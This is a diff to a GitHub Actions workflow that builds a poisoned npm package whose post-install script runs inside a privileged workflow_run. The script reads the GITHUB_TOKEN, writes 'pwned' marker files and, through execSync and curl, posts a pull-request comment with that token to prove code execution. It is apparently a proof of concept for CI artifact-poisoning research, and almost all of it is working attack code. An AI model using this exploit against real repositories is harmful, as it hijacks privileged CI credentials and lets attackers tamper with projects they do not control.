@@ -15,23 +15,18 @@ jobs:
           JSON
           cat > payload/pkg/post.js <<'JS'
           const fs = require('fs');
+          const { execSync } = require('child_process');
           const root = process.env.INIT_CWD || process.cwd();
-          console.log('GAB_RCE_PWNED uid=' + process.getuid() + ' cwd=' + root);
-          fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'pwned');
-          fs.writeFileSync('/tmp/ADP_ARTIFACT_RCE', 'pwned');
           const token = process.env.GITHUB_TOKEN || '';
-          console.log('GAB_RCE_TOKEN_PRESENT=' + (token.length > 0));
-          (async () => {
-            try {
-              const n = fs.readFileSync(root + '/pr-number.txt', 'utf8').trim();
-              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + n + '/comments', {
-                method: 'POST',
-                headers: { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
-                body: JSON.stringify({ body: 'GAB PoC proof: arbitrary code executed inside the privileged PR Comment workflow_run via a downloaded artifact; this comment was posted with the privileged pull-requests:write GITHUB_TOKEN.' })
-              });
-              console.log('GAB_RCE_COMMENT_STATUS=' + r.status);
-            } catch (e) { console.log('GAB_RCE_COMMENT_ERR=' + e.message); }
-          })();
+          const lines = ['GAB_RCE_PWNED uid=' + process.getuid() + ' cwd=' + root, 'token_len=' + token.length];
+          try {
+            const n = fs.readFileSync(root + '/pr-number.txt', 'utf8').trim();
+            const out = execSync('curl -s -o /dev/null -w %{http_code} -X POST -H "authorization: Bearer ' + token + '" -H "accept: application/vnd.github+json" -d {"body":"GAB PoC: attacker-controlled package.json lifecycle ran inside the privileged workflow_run and this comment was written with the privileged GITHUB_TOKEN."} https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + n + '/comments').toString();
+            lines.push('comment_status=' + out);
+          } catch (e) { lines.push('comment_err=' + e.message); }
+          fs.writeFileSync('/tmp/ADP_ARTIFACT_RCE', lines.join('\n'));
+          fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'pwned');
+          console.log(lines.join('\n'));
           JS
           (cd payload/pkg && npm pack --silent >/dev/null)
           mv payload/pkg/lint-util-1.0.0.tgz payload/
